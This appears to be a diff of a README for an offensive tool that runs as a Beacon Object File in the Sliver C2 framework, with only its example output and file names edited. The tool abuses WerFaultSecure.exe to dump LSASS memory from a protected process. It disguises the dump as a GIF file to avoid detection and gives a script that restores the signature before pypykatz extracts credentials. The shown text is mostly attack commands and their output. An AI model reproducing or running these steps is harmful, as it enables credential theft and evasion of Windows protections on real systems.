@@ -32,10 +32,10 @@ sliver (PROPER_OBJECTIVE) > werdump 'C:\Programdata\WerFaultSecure.exe' 564 'C:\
 [*] Successfully executed werdump (coff-loader)
 [*] Got output:
 [+] Enabled SeDebugPrivilege
-[*] Main thread ID for PID 564: 576
-[+] SUCCESS! Created PPL Process With Pid: [4208], Protection Level [0]
-[+] Successfully Dumped process 564, Find the dump in the following path C:\Programdata\lsass.gif
-[+] Successfully resumed process with PID: 564
+[*] Main thread ID for PID 888: 912
+[+] SUCCESS! Created PPL Process With Pid: [10184], Protection Level [0]
+[+] Successfully resumed process 888
+[+] Successfully Dumped process 888, Find the dump in the following path lsass.gif
 ```
 
 This BOF take the path to `WerFaultSecure.exe`, pid of the process to dump, the dump path and the signature to modify the first four bytes of the dump file.
@@ -49,9 +49,9 @@ $ make install
 To restore the magic bytes
 
 ```shell
-$ python3 Scripts/Restore.py lsass.gif lsass.dump GIF8
-Successfully restored MiniDump signature in 'lsass.dump'
-Now run [ pypykatz lsa minidump lsass.dump ] to parse the minidump
+$ python3 Scripts/Restore.py lsass.gif lsass.dmp GIF8
+Successfully restored MiniDump signature in 'lsass.dmp'
+Now run [ pypykatz lsa minidump lsass.dmp ] to parse the minidump
 ```
 
 ## Havoc
